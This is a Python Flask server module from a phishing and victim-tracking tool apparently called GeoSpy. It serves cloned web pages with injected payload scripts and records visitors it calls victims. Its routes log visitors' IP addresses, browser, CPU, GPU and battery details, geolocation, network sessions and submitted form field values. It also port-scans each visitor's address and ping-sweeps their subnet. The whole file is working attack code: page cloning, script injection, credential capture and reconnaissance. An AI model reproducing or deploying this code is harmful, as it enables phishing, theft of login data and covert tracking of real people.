#!/usr/bin/env python
# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import time
from core.dependence import urllib2
from flask import Flask, render_template, session, request, json, Response
from core.user_objects import *
import core.stats
from core.utils import utils
from core.db import Database
import os
import sys
import platform
from multiprocessing import Process
"""
from bs4 import BeautifulSoup
from urlparse import urlparse
import lxml
"""

# Main parts, to generate relationships among others
GeoSpy = core.stats.GeoSpy
app = core.stats.app

# call database
db = Database()

class victim_server(object):
    @app.route("/" + GeoSpy.victim_path)
    def homeVictim():
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        """
        clone_html  = opener.open(GeoSpy.url_to_clone).read()
        soup = BeautifulSoup(clone_html, 'lxml')
        parsed_uri = urlparse(GeoSpy.url_to_clone)
        domain = '{uri.scheme}://{uri.netloc}/'.format(uri=parsed_uri)
        for s in soup.find_all('script'):
            url = s.get('src')
            if url is not None:
                if url.startswith('/'):
                    clone_html = clone_html.replace(url, domain + url)
        for css in soup.find_all('link'):
            url = css.get('href')
            if url is not None:
                if url.startswith('/'):
                    clone_html = clone_html.replace(url, domain + url)

        for img in soup.find_all('img'):
            url = img.get('src')
            if url is not None:
                if url.startswith('/'):
                    clone_html = clone_html.replace(url, domain + url)
        """
        if (GeoSpy.type_lure == 'local'):
            html = assignScripts(victim_inject_code(render_template("/" + GeoSpy.url_to_clone), 'payload', '/', GeoSpy.gmaps))
        else:
            html = assignScripts(victim_inject_code(opener.open(GeoSpy.url_to_clone).read(), 'payload', GeoSpy.url_to_clone, GeoSpy.gmaps))
        return html

    @app.route("/register", methods=["POST"])
    def register():
        vId = request.form['vId']
        if vId == '':
          vId = utils.generateToken(5)

        victimConnect = victim(vId, request.environ['REMOTE_ADDR'], request.user_agent.platform, request.user_agent.browser, request.user_agent.version,  utils.portScanner(request.environ['REMOTE_ADDR']), request.form['cpu'], time.strftime("%Y-%m-%d - %H:%M:%S"))
        victimGeo = victim_geo(vId, 'city', request.form['countryCode'], request.form['country'], request.form['query'], request.form['lat'], request.form['lon'], request.form['org'], request.form['region'], request.form['regionName'], request.form['timezone'], request.form['zip'], request.form['isp'], str(request.user_agent), request.form['refer'])

        vRA = request.environ['REMOTE_ADDR']

        gHA = Process(target=getHostsAlive, args=(vRA, vId,))
        gHA.start()

        utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " A " + utils.Color['whiteBold'] + "user" + utils.Color['white'] + " has been connected from " + utils.Color['blue'] + victimGeo.ip + utils.Color['white'] + ' with the following identifier: ' + utils.Color['green'] + vId + utils.Color['white'])
        cant = int(db.sentences_victim('count_times', vId, 3, 0))

        db.sentences_victim('insert_click', [vId, GeoSpy.url_to_clone, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        db.sentences_victim('delete_networks', [vId], 2)

        if cant > 0:
            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s the " + str(cant + 1) + " time for " + utils.Color['green'] + str(vId) + utils.Color['white'] + "@" + utils.Color['blue'] + victimGeo.ip + utils.Color['white'])
            db.sentences_victim('update_victim', [victimConnect, vId, time.time()], 2)
            db.sentences_victim('update_victim_geo', [victimGeo, vId], 2)
        else:
            utils.Go(utils.Color['white'] + "[" + utils.Color['blueBold'] + "*" + utils.Color['white'] + "]" + " " + "It\'s the first time for " + utils.Color['green'] + str(vId) + utils.Color['white'] + "@" + utils.Color['blue'] + victimGeo.ip + utils.Color['white'])
            db.sentences_victim('insert_victim', [victimConnect, vId, time.time()], 2)
            db.sentences_victim('insert_victim_data', [vId], 2)
            db.sentences_victim('insert_victim_battery', [vId], 2)
            db.sentences_victim('insert_victim_geo', [victimGeo, vId], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/nr", methods=["POST"])
    def networkRegister():
        vId = request.form['vId']
        vIp = request.form['ip']
        vnetwork = request.form['red']
        if vId == '':
          vId = utils.generateToken(5)

        cant = int(db.sentences_victim('count_victim_network', [vId, vnetwork], 3, 0))

        if cant > 0:
            db.sentences_victim('update_network', [vId, vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        else:
            db.sentences_victim('insert_networks', [vId, vIp, request.environ['REMOTE_ADDR'], vnetwork, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
            utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "+" + utils.Color['white'] + "]" + utils.Color['whiteBold'] + " " + vnetwork + utils.Color['white'] + " session detected from " + utils.Color['blue'] + vIp + utils.Color['white'] + ' ' + "with ID: " + utils.Color['green'] + vId + utils.Color['white'])
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/lr", methods=["POST"])
    def locationRegister():
        vId = request.form['vId']
        lat = request.form['lat']
        lon = request.form['lon']

        db.sentences_victim('location_victim', [vId, lat, lon], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/lc", methods=["POST"])
    def connectionRegister():
        vId = request.form['vId']
        con = request.form['con']
        host = request.form['host']

        db.sentences_victim('connection_victim', [vId, con, host], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/bs", methods=["POST"])
    def batteryStatusRegister():
        vId = request.form['id']
        b_data = request.form['d']
        b_type = request.form['t']
        
        db.sentences_victim('update_battery', [vId, b_data, b_type], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/nm", methods=["POST"])
    def navigationMode():
        vId = request.form['id']
        b_data = request.form['d']
        b_data_2 = request.form['dn']
        
        db.sentences_victim('update_navigationmode', [vId, b_data, b_data_2], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})

    @app.route("/rv")
    def redirectVictim():
        url = request.args.get('url')
        if url[0:4] != 'http':
            url = 'http://' + url
        opener = urllib2.build_opener()
        headers = victim_headers(request.user_agent)
        opener.addheaders = headers
        html = assignScripts(victim_inject_code(opener.open(url).read(), 'vscript', url, GeoSpy.gmaps))
        return html

    @app.route("/regv", methods=["POST"])
    def registerRequest():
        vrequest = victim_request(request.form['vId'], request.form['site'], request.form['fid'], request.form['name'], request.form['value'], request.form['sId'])
        db.sentences_victim('insert_requests', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "=" + utils.Color['white'] + "]" + " " + 'Receiving data from: ' + utils.Color['green'] + vrequest.id + utils.Color['white']  + ' ' + 'on' + ' ' + utils.Color['blue'] + vrequest.site + utils.Color['white'] + '\t\n' + vrequest.fid + '\t' + vrequest.name + ':\t' + vrequest.value)
        return json.dumps({'status' : 'OK', 'vId' : vrequest.id})

    @app.route("/tping", methods=["POST"])
    def receivePiregisterGPUng():
        vrequest = request.form['id']
        db.sentences_victim('report_online', [vrequest], 2)
        db.sentences_victim('update_lastping', [vrequest, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
        return json.dumps({'status' : 'OK', 'vId' : vrequest})

    @app.route("/cIp", methods=["POST"])
    def changeLocalIp():
        vrequest = request.form['id']
        vIp = request.form['ip']
        db.sentences_victim('update_localIp', [vrequest, vIp], 2)
        return json.dumps({'status' : 'OK', 'vId' : vrequest})

    @app.route("/gGpu", methods=["POST"])
    def setGpuInfo():
        vId = request.form['vId']
        vData = request.form['data']
        db.sentences_victim('update_gpu', [vId, vData], 2)
        return json.dumps({'status' : 'OK', 'vId' : vId})
    

def getHostsAlive(ip, vId):
    hDB = Database()
    try:
        hDB.sentences_victim('delete_hostalive', vId, 2)
        split_ip = ip.split('.')
        net = split_ip[0] + '.' + split_ip[1] + '.' + split_ip[2] + '.'
        if ip != '127.0.0.1':
            if (platform.system()=='Windows'):
                ping = 'ping -n 1 -w 5'
            else:
                ping = 'ping -c 1 -t 3'
            for sub_net in range(1, 255):
                address = net + str(sub_net)
                response = os.popen(ping + ' ' + address)
                for line in response.readlines():
                    if ('time=' in line.lower()):
                        lPos = line.find('time=')
                        tmpLine = line[lPos+5:lPos+15]
                        lPos = tmpLine.find('ms')
                        tmpLine = tmpLine[0:lPos+2]
                        
                        hDB.sentences_victim('register_hostalive', [vId, address, tmpLine, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
                        break
        else:
            hDB.sentences_victim('register_hostalive', [vId, 'OWN HOST', 0, time.strftime("%Y-%m-%d - %H:%M:%S")], 2)
    except ValueError:
        pass

def assignScripts(code):
    code = code.replace("base.js", GeoSpy.JSFiles[0]['src'])
    code = code.replace("libs.min.js",GeoSpy.JSFiles[1]['src'])
    code = code.replace("login.js", GeoSpy.JSFiles[2]['src'])
    code = code.replace("payload.js", GeoSpy.JSFiles[3]['src'])
    code = code.replace("GeoSpy.js", GeoSpy.JSFiles[4]['src'])
    code = code.replace("vscript.js", GeoSpy.JSFiles[5]['src'])
    return code
